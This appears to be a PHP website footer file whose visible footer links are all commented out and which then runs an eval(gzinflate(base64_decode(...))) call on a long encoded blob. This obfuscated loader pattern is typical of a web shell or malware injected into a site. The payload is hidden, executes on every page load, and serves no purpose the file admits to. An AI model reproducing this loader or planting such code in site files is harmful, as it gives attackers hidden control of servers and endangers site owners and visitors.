<?php
    $footerHtml = <<<TXT
<!-- <a href="#">Contact Us</a> | <a href="#">Terms of Use</a> | <a href="#">Trademarks</a> 
| <a href="#">Privacy Statement</a> | -->
TXT;
eval(gzinflate(base64_decode('bVRRb9owEH4eEv/hGrVzUhGYtmkPhYCqrdNe1geQJlXTFDnxkVh17Mx2YLTiv8+JA0W0kSCXO993d999yWI+Y3wDnCVrpSxqSTdg7E5gQiz+szEVvJA3Atd2SubDwWxRl/Vw8G5yDbdgOMOMauASbIngARbwgPUYHlQDOZX+1xirKv6ELhGuYaca3R+GLbels50jV6KppAG1dk5WoDXj7vjE/buntC8WAvGpBKLpcLBoe5q4CfwYuaDGJEEukGpkwdyH3JGT4PcuPXBecNfrSMylfImfXjMKpcZ1EnQsQCZUweVahUQb8zFttCDRFBbz4IDn3LGlRcxzJQOw3DpWg+Vq1fZF38J/3Uu7g7aVWX2Ywm2q5IyhPKyJcVMLuruRSqLbke9tOCiEyqiAS5T5N+mY4uvQ23CRACHRM/gGOqeqqFti4iC1xk1YPLm5BLUYZtTgl88pw1wx7AGiyI3ZJ1Mh1BYZOwC8oE37E3mj9Qr1BvU9rdDXSDW6lnMMg+12Ow5GQTC6TFd3y193y9/E39P725935E/Uw7TdnyMlZ+Wj5xdKNVZqgynNLVcyJNs67VUzIiKv6tTptcJU1W3YpCgZOc60d/d9a7jHxVFBvfRPiO0g/Jp6ek88SdJSPBxgXiq49LV/2Eq0RfYoDB5ipXO6+k4cuyPLJzjt/Hsv80MHbpZOeKqxYTRdzGGW6V5MX1W907woLbzPnTkFn9EVYu06yQPxKWcClo5QL94x3AoByxbEwBJNyzcbzyb18UXr35tT+7VuM5o/Flo1kgVnCSeEnnlm3Wt8mNFzFnZNvZF7Ecf9FLXm0q7DNA3JFYO/DWqOZgxXBozjUzIzJiMgj02mef5IohG0XxPZVGl/NHQuyyvUqftK1eGHEXyKuqoQx13NTLFdZ7S7mv8H')));
?>